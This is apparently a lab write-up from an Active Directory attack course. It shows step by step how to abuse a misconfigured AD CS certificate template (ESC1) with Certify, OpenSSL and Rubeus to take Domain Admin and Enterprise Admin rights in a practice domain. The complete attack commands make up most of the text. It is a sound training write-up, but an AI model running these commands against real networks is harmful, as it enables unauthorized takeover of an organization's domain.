# 🪜 Find vulnerable templates w/ AD CS  to escalate to DA and EA

We can start by using the Certify tool to check for AD CS in moneycorp ->

```
C:\AD\Tools\Certify.exe cas
```

<figure><img src="../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>

We can list all the templates using the following command. Going through the output we can find some interesting templates:

```
C:\AD\Tools\Certify.exe find
```

<figure><img src="../../.gitbook/assets/image (1162).png" alt=""><figcaption></figcaption></figure>

```
[snip]
CA Name : mcorp-dc.moneycorp.local\moneycorpMCORP-DC-CA
 Template Name : SmartCardEnrollment-Agent    
 Schema Version : 2
 Validity Period : 10 years
 Renewal Period : 6 weeks
 msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN,
SUBJECT_REQUIRE_DIRECTORY_PATH
 mspki-enrollment-flag : AUTO_ENROLLMENT
 Authorized Signatures Required : 0
pkiextendedkeyusage : Certificate Request Agent     
 mspki-certificate-application-policy : Certificate Request Agent
 Permissions
 Enrollment Permissions
 Enrollment Rights : dcorp\Domain Users S-1-5-21-719815819-3726368948-3917688648-513    
[snip]
Template Name : HTTPSCertificates     
 Schema Version : 2
 Validity Period : 1 year
 Renewal Period : 6 weeks 
msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
[snip]
```

Now that we have the templates that we find interesting, we can try out for Privilege Escalation to DA and EA using ESC1

The template HTTPSCertificates looks interesting. Let's get some more information about it as it allows requestor to supply subject name:

<figure><img src="../../.gitbook/assets/image (1163).png" alt=""><figcaption><p>S-1-5-21-719815819-3726368948-3917688648-1123</p></figcaption></figure>

```
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

what this means is that the HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that student613 is a member of RDPUsers group. This means that we can request certificate for any user as student613.

Now we can try to request a certificate for Domain Admin - Administrator:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now let's Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to esc1.pem:

```
notepad C:\AD\Tools\esc1.pem
```

<figure><img src="../../.gitbook/assets/image (1165).png" alt=""><figcaption></figcaption></figure>

We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use SecretPass@123 as the export password ->

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx 
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's start by encoding "asktgt"

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can check if we actually have DA privileges:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Save the certificate to esc1-EA.pem and convert it to PFX. I will use SecretPass@123 as the export password:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx   
```

Encode asktgt and run the follwing command ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And check for EA privileges ->

```
winrs -r:mcorp-dc cmd /c  set username
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Need to go back on this process later on
{% endhint %}

Now let's try Privilege Escalation to DA and EA using ESC3
